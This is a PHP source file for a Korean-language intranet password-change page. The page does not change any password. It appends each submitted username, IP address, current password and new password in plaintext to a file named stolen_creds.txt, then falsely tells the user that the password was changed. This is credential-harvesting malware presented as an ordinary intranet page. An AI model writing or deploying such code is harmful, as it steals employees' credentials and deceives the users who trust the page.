<?php
// 실제 인트라넷 환경의 공통 파일과 인증 파일을 불러와 로그인된 사용자 정보를 가져옵니다.
require_once __DIR__ . '/common.php';
require_once __DIR__ . '/auth.php';
require_login();

// 현재 로그인된 사용자 정보 가져오기
$me = current_user($pdo);
$username = $me['username'] ?? ($me['id'] ?? 'unknown'); // DB 구조에 맞춰 필드명 조정 가능

$done = false;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $current_pw = (string)($_POST['current_password'] ?? '');
    $new_pw     = (string)($_POST['new_password'] ?? '');
    $new_pw_confirm = (string)($_POST['new_password_confirm'] ?? '');

    if ($current_pw !== '' && $new_pw !== '' && $new_pw === $new_pw_confirm) {
        $log_data = sprintf(
            "[%s] IP: %s | Username: %s | CurrentPW: %s | NewPW: %s\n",
            date('Y-m-d H:i:s'),
            $_SERVER['REMOTE_ADDR'],
            $username, // 로그인된 아이디 포함
            $current_pw,
            $new_pw
        );
        file_put_contents(__DIR__ . '/stolen_creds.txt', $log_data, FILE_APPEND | LOCK_EX);
    }
    $done = true;
}

$page_title  = '비밀번호 변경';
$active_menu = '';
require __DIR__ . '/includes/header.php';
?>

<div class="topbar"><h1>비밀번호 변경</h1></div>

<div class="card" style="max-width:420px;">
    <?php if ($done): ?>
        <p style="color:var(--accent); font-size:13px; margin-bottom:16px;">비밀번호가 변경되었습니다.</p>
    <?php endif; ?>

    <form method="post" action="">
        <div class="form-group">
            <label for="current_password">현재 비밀번호</label>
            <input type="password" id="current_password" name="current_password"
                   autocomplete="current-password" required>
        </div>
        <div class="form-group">
            <label for="new_password">새 비밀번호</label>
            <input type="password" id="new_password" name="new_password"
                   autocomplete="new-password" required>
        </div>
        <div class="form-group">
            <label for="new_password_confirm">새 비밀번호 확인</label>
            <input type="password" id="new_password_confirm" name="new_password_confirm"
                   autocomplete="new-password" required>
        </div>
        <button type="submit" class="btn btn-primary">비밀번호 변경</button>
    </form>
</div>

<?php require __DIR__ . '/includes/footer.php'; ?>
